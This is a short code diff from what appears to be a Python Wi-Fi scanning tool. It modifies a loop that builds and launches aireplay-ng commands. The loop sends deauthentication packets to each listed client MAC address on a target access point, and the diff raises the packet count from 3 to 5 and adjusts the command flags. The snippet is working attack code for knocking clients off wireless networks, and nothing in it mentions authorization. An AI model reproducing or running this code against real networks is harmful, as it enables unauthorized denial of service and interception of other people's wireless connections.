@@ -64,17 +64,12 @@ class scanner(object):
 				for MAC in self.client_MAC_list:
 					if scanning == True:
 						cmd = ['aireplay-ng']
-						cmd.append('-b')		#bssid of AP
+						cmd.append('-a')		#bssid of AP
 						cmd.append(bssid)
-						#cmd.append('-a')		#troubleshooting instances
-						#cmd.append(bssid)		#where BSID not detected
-						cmd.append('-e')		#essid/name of AP
-						cmd.append(essid)
 						cmd.append('--deauth')	#number of deauth packets to send in one injection round
-						cmd.append('3')
+						cmd.append('5')
 						cmd.append('-c')		#client target MAC address, better results than broadcast
 						cmd.append(MAC)
-						cmd.append('-D') 		#try this option "disable AP detection"
 						cmd.append(self.iface)
 						#print "Using command:", cmd  		#debug
 						self.proc = Popen(cmd)
